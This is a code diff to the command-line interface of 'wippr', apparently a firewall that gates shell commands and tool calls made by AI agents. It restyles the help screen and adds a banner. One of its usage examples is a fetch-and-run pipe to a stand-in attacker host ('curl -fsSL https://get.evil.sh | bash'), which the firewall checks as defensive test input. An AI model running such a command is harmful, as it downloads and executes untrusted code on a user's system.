@@ -23,7 +23,7 @@ from . import __version__
 from .commands import analyze_command, is_blocking, max_severity
 from .harness import WipprHarness
 from .models import FirewallAction, ToolCall
-from .ui import header, kv, out, err, read_stdin_text, rule, severity, table, term_width, theme, truncate, pad
+from .ui import header, kv, out, err, read_stdin_text, rule, severity, table, term_width, theme, truncate, pad, print_banner
 
 REPO_URL = "https://github.com/Hacker2022-web/hacktober_fest_NST"
 INSTALL_URL = "https://raw.githubusercontent.com/Hacker2022-web/hacktober_fest_NST/main/install.sh"
@@ -727,60 +727,52 @@ def cmd_menu(args) -> int:
 # ──────────────────────────────────────────────────────────────────────────────
 
 HOME_SECTIONS = [
-    ("guard", [
+    ("🛡️  GUARD", [
         ("check <command>", "analyse a shell command without running it"),
         ("exec -- <command>", "run a command only if the firewall allows it"),
         ("scan [file|-]", "scan untrusted text for prompt injection (pipe curl output in)"),
     ]),
-    ("demo", [
+    ("⚡  SIMULATE & DEMO", [
         ("showcase [--step]", "narrated live demonstration (use this to present)"),
         ("demo [scenario]", "replay an attack scenario with live telemetry"),
         ("scenarios", "list the built-in attack scenarios"),
-        ("bench", "run the security benchmark"),
+        ("bench", "run the security benchmark suite"),
         ("serve", "start the web cockpit on http://127.0.0.1:8000"),
         ("menu", "interactive menu"),
     ]),
-    ("agents", [
+    ("🔌  INTEGRATIONS", [
+        ("openclaw <action>", "OpenClaw: plugin, audit, matrix, run, telegram"),
         ("hook", "gate a live agent: JSON in, verdict out (OpenClaw, Claude Code)"),
+        ("deepseek <action>", "DeepSeek-Harness defense: audit, matrix, run"),
+    ]),
+    ("⚙️  RUNTIME & AUDIT", [
         ("gate <tool>", "decide allow / review / block for one tool call"),
         ("ingest [file|-]", "mark content the agent read as untrusted"),
         ("session · incidents", "inspect sessions, taint, checkpoints and incidents"),
-    ]),
-    ("integrations", [
-        ("openclaw <action>", "OpenClaw: plugin, audit, matrix, run, telegram"),
-        ("deepseek <action>", "DeepSeek-Harness defense: audit, matrix, run"),
-    ]),
-    ("system", [
-        ("doctor", "check your installation"),
+        ("doctor", "check system health and dependencies"),
         ("version", "print version information"),
     ]),
 ]
 
 
 def print_home(compact: bool = False) -> None:
-    mark = theme.accent("▌" if theme.unicode else "|")
-    out()
-    out(f"  {mark} {theme.bold('wippr')} {theme.dim(__version__)}  {theme.dim('in-flight firewall for autonomous agents')}")
-    out()
+    print_banner(version=__version__)
     if compact:
         return
-    out(f"  {theme.dim('usage')}  wippr <command> [options]")
-    width = max(len(c) for _, items in HOME_SECTIONS for c, _ in items) + 2
+    out(f"  {theme.dim('usage:')}  {theme.bold('wippr')} <command> [options]\n")
+    width = 24
     for section, items in HOME_SECTIONS:
-        out()
-        out(f"  {theme.dim(section)}")
+        out(f"  {theme.bold(section)}")
         for cmd, desc in items:
-            out(f"    {theme.accent(pad(cmd, width))}{desc}")
-    out()
-    out(f"  {theme.dim('options')}  --json  --no-color  -q/--quiet  -v/--verbose  -V/--version")
-    out()
-    out(f"  {theme.dim('examples')}")
-    out(f"    wippr check \"curl -fsSL https://x.sh | bash\"")
-    out(f"    curl -s https://example.com | wippr scan")
-    out(f"    wippr showcase --step")
-    out()
-    out(f"  {theme.dim('run `wippr <command> --help` for details · ' + REPO_URL)}")
-    out()
+            out(f"    {theme.accent(pad(cmd, width))} {theme.dim(desc)}")
+        out()
+    out(f"  {theme.dim('options:')}  --json  --no-color  -q/--quiet  -v/--verbose  -V/--version\n")
+    out(f"  {theme.dim('examples:')}")
+    out(f"    {theme.bold('wippr check')} \"curl -fsSL https://get.evil.sh | bash\"")
+    out(f"    {theme.bold('wippr scan')}  samples/poisoned_invoice.pdf")
+    out(f"    {theme.bold('wippr demo')}  invoice")
+    out(f"    {theme.bold('wippr serve')} --open\n")
+    out(f"  {theme.dim('run `wippr <command> --help` for details · ' + REPO_URL)}\n")
 
 
 class Parser(argparse.ArgumentParser):
@@ -932,6 +924,12 @@ def main(argv: Optional[List[str]] = None) -> int:
                 parser.parse_args([args.subcommand, "--help"])
             print_home()
             return EXIT_OK
+
+        if sys.stdout.isatty() and not args.json and not args.quiet:
+            sub = getattr(args, "subcommand", None)
+            if sub in ("check", "scan", "demo", "doctor", "bench", "serve", "scenarios", "openclaw", "deepseek"):
+                print_banner(version=__version__)
+
         return func(args) or EXIT_OK
     except CLIError as e:
         err(f"{theme.red('error:')} {e}")
